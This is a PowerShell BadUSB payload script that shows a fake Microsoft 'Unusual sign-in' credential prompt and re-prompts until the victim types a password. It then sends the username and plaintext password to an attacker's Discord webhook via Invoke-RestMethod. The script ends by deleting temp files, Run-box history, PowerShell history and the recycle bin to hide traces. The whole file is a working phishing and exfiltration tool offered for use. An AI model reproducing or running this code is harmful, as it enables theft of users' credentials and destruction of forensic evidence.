
<#
.SYNOPSIS
	This script is meant to trick your target into sharing their credentials through a fake authentication pop up message
	original script by jakobi : https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/tree/main/Payloads/Flip-Credz-Plz
	Reworked by Kira
.DESCRIPTION 
	A pop up box will let the target know "Unusual sign-in. Please authenticate your Microsoft Account"
	This will be followed by a fake authentication ui prompt. 
	If the target tried to "X" out, hit "CANCEL" or while the password box is empty hit "OK" the prompt will continuously re pop up 
	Once the target enters their credentials their information will be uploaded to Discord webhook for collection


#>

#------------------------------------------------------------------------------------------------------------------------------------

$dc = "YOUR DISCORD WEBHOOK"

#------------------------------------------------------------------------------------------------------------------------------------


#initiate Embed Array var
[System.Collections.ArrayList]$embedArray = @()
$description = ""
$color = "4289797"
 
#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to generate the ui.prompt you will use to harvest their credentials
#>

function Get-Creds {
$form = $null

while ($form -eq $null)
{
    $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
    $cred.getnetworkcredential().password

    if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
    {
        Add-Type -AssemblyName PresentationCore,PresentationFramework
	$msgBody = "Credentials cannot be empty!"
	$msgTitle = "Error"
	$msgButton = 'Ok'
	$msgImage = 'Stop'
	$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
	Write-Host "The user clicked: $Result"
        $form = $null
    }
    
    else{
    $creds = $cred.GetNetworkCredential() | fl
    return $creds
    }
}

}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to pause the script until a mouse movement is detected
#>
function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}
#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
#>
Pause-Script
Caps-Off
Add-Type -AssemblyName PresentationCore,PresentationFramework
$msgBody = "Please authenticate your Microsoft Account."
$msgTitle = "Authentication Required"
$msgButton = 'Ok'
$msgImage = 'Warning'
$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
Write-Host "The user clicked: $Result"
$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

#------------------------------------------------------------------------------------------------------------------------------------


$title = "EXFILTRATED FROM COMPUTER : " + $env:computername
$description = "**User:** " + [Environment]::UserDomainName+'\'+[Environment]::UserName + "
**Password:** " + $creds[0]


	#Create Embed Object
	$embedObject = [PSCustomObject]@{
		color = $color
		title = $title
		description = $description
	}

	#Add Object to Array
	$embedArray.Add($embedObject)
	
	#Creating the embed
	$payload = [PSCustomObject]@{
		embeds = $embedArray
	}
	
	#Send data using REST method
	Invoke-RestMethod -Uri $dc -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'


#------------------------------------------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there

#>
# Delete contents of Temp folder 
try {
    rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
	rm c:\windows\temp\* -r -Force -ErrorAction SilentlyContinue
} catch {
    Write-Error "Error deleting contents of Temp folder: $($_.Exception.Message)"
}

# Delete run box history
try {
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
} catch {
    Write-Error "Error deleting run box history: $($_.Exception.Message)"
}

# Delete powershell history
try {
    Remove-Item (Get-PSreadlineOption).HistorySavePath
} catch {
    Write-Error "Error deleting PowerShell history: $($_.Exception.Message)"
}

# Deletes contents of recycle bin
try {
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
} catch {
    Write-Error "Error deleting contents of recycle bin: $($_.Exception.Message)"
}
exit


